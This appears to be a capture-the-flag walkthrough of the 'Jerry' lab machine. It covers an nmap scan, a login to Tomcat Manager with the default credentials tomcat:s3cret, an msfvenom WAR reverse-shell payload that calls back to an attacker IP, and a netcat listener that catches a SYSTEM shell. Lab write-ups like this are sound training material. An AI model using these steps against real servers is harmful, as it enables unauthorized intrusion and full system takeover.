# Jerry

## Nmap

```
sudo nmap 10.10.10.95 -p- -sS -sV  
 
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 203.34 seconds
```

The root page for port 8080 takes us to an install of Apache Tomcat / 7.0.88.

![](<../../../.gitbook/assets/image (1676).png>)

When clicking on the 'Manager App' button we are asked for authentication before proceeding. Looking up the default credentials on Google we get the result below.

![](<../../../.gitbook/assets/image (1679).png>)

From the list above I tried `tomcat:s3cret` and was granted access as shown below. I have done penetration testing against Tomcat previously and know that once you have access to the Manager App you can upload a malicious WAR file in order to gain shell.

![](<../../../.gitbook/assets/image (1678).png>)

Using the command below we can create a WAR reverse shell with `msfvenom`.

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=80 -f war > shell.war
```

![](<../../../.gitbook/assets/image (1680).png>)

Once uploaded we can then see the upload shell under 'Applications'.

![](<../../../.gitbook/assets/image (1681).png>)

Then start a `netcat` listener on the attacking machine:

```
sudo nc -lvp 80
```

Then click on the uploaded WAR file under applications to execute. As per below you should then have a reverse shell as SYSTEM.

![](<../../../.gitbook/assets/image (1683).png>)
